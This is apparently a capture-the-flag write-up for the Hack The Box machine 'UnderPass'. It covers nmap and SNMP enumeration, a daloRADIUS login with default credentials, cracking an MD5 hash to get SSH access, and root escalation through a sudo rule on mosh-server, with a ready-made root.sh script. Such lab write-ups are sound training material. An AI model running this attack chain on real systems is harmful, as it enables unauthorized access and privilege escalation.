#### by [t2p](https://app.hackthebox.com/profile/1064515)

## <span style="color: red; font-weight: bold;">Recon</span>
### <span style="color: #3498eb;">nmap</span>

#### <span style="color: #ebe134;">TCP</span>

`nmap` finds two open TCP ports ssh(22) and http(80)

```zsh
❯ sudo nmap -sCV -T 4 --min-rate 3000 -oA ./nmap/underpass 10.129.41.174
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 20:19 EST
Nmap scan report for 10.129.41.174
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.09 seconds
```

The results from `nmap` scanning TCP show me that port 80 just says this machine is using `Apache` and is working fine, so there is no obvious attack surface, let's try UDP.
#### <span style="color: #ebe134;">UDP</span>

We can see that this is `snmp` running on UDP port 161 and we have information that the server is probably running [Daloradius](https://github.com/lirantal/daloradius) - a web administration interface for FreeRADIUS.

```zsh
❯ sudo nmap -sCV -sU -T4 --min-rate 3000 -p 53,67,123,161 -oA ./nmap/underpass_udp 10.129.41.174
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 20:45 EST
Nmap scan report for underpass.htb (10.129.41.174)
Host is up (0.24s latency).

PORT    STATE  SERVICE VERSION
53/udp  closed domain
67/udp  closed dhcps
123/udp closed ntp
161/udp open   snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 56m17.34s (337734 timeticks)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 30
|_  snmpEngineTime: 56m17s
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
```
### <span style="color: #3498eb;">SNMP</span>

I would add this line to `/etc/hosts` instead I have to remember its ip address.

```zsh
❯ echo 10.129.41.174 underpass.htb | sudo tee -a /etc/hosts
```

Sau đó đi bộ với `SNMP`.

```zsh
snmpwalk -c public -v1 underpass.htb
```

Same result, recommended to use this method because `snmpbulkwalk` has better performance.

```zsh
❯ snmpbulkwalk -c public -v2c underpass.htb
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (437584) 1:12:55.84
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (439048) 1:13:10.48
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E8 0C 16 02 01 2D 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 217
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Nothing special, except to re-emphasize that it's running `dalorius` with an email address `steve@underpass.htb`
### <span style="color: #3498eb;">HTTP 80</span>

#### <span style="color: #ebe134;">FUZZING</span>

I stubbornly tried to see if `Gobuster` would produce any new results but nothing here.

```zsh
❯ gobuster dir -u http://10.129.41.174 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error --timeout=5s -t 50
```

#### <span style="color: #ebe134;">SITE</span>

Looking back at the results of `nmap` with UDP, I tried accessing `http://underpass.htb/dalorianius/`

![1.png](Old_machines/UnderPass/images/1.png)

On the official github of `dalorius`, you will see the path structure `app/operators/login.php`
Oh this is an accessible login page, they still keep the default path.

![2.png](Old_machines/UnderPass/images/2.png)

You can log in with the default account and password `admininistrator:radius`

![3.png](Old_machines/UnderPass/images/3.png)

## <span style="color: red; font-weight: bold;">Shell as</span> **`svcMosh`**
### <span style="color: #3498eb;">Crack the password</span>

In the user list section you can see the user `svcMosh` and the password hash.

![4.png](Old_machines/UnderPass/images/4.png)

Cracking password with `hashcat`:

```zsh
❯ echo "412DD4759978ACFCC81DEAB01B382403" > hash
❯ hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt
...
412dd4759978acfcc81deab01b382403:underwaterfriends
```
### <span style="color: #3498eb;">SSH</span>

Login with ssh via user `svcMosh:underwaterfriends`

```zsh
❯ ssh svcMosh@underpass.htb
...
svcMosh@underpass:~$ cat user.txt
7da53244e41...........211d851dd8
```
## <span style="color: red; font-weight: bold;">Shell as root</span>

### <span style="color: #3498eb;">List sudo permissions</span>

It is possible to run `/usr/bin/mosh-server` without a password with `sudo`:

```zsh
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

This is definitely an exploit to gain `root` privileges.
### <span style="color: #3498eb;">Check Mosh</span>

#### <span style="color: #ebe134;">Analysis</span>

```zsh
svcMosh@underpass:~$ sudo /usr/bin/mosh-server


MOSH CONNECT 60001 Ris0qk5c5Skk4FIjZmWZFw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2840]

```

Output:

`MOSH CONNECT 60001 Ris0qk5c5Skk4FIjZmWZFw`:

`MOSH CONNECT` indicates that a `Mosh` session is starting.
`60001` is probably the port the server is listening for connections from clients on.
`Ris0qk5c5Skk4FIjZmWZFw` is definitely a session identifier, which uniquely identifies this Mosh session.

Check the `mosh-server` options:

```zsh
svcMosh@underpass:~$ sudo /usr/bin/mosh-server --help
Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

Check the mosh-server process ID.

![Old_machines/UnderPass/images/5.png](Old_machines/UnderPass/images/5.png)

#### <span style="color: #ebe134;">Exploit</span>

That means `mosh` will create a listening session and be ready to connect if requested. Open a shell with that user.
The problem here is that when we check the process ID of `mosh`, it is being run by `root`. This means we will connect directly to this session via the ID and connection port, at this point, we will have the shell of the user `root`.

I will use `mosh-client`, first, let's understand the full command:

```zsh
svcMosh@underpass:~$ mosh-client -# "/bin/bash" 127.0.0.1 60001
MOSH_KEY environment variable not found.
```

Shell as root:
```zsh
svcMosh@underpass:~$ sudo /usr/bin/mosh-server 


MOSH CONNECT 60001 rnJQ6L+HaXYEw1LTAUmH0Q

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 3015]
svcMosh@underpass:~$ export MOSH_KEY="rnJQ6L+HaXYEw1LTAUmH0Q"
svcMosh@underpass:~$ mosh-client -# "/bin/bash" 127.0.0.1 60001
```

And bump!

```zsh
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# cat /root/root.txt 
4769e56724a.............de0326dad
root@underpass:~# 
```

For convenience, I will create an automatic exploit, you just need to copy it into `root.sh` then:

```zsh
chmod +x root.sh
./root.sh
```

Exploit script for `root.sh`:

```bash
#!/bin/bash
echo "ENJOYYYY!"
sleep 2
result=$(sudo /usr/bin/mosh-server | sed -n '3p')
read port key <<< $(echo "$result" | awk '{print $3, $4}')
export MOSH_KEY=$key
mosh-client -# "/bin/bash" 127.0.0.1 $port
```

![Old_machines/UnderPass/images/6.png](Old_machines/UnderPass/images/6.png)
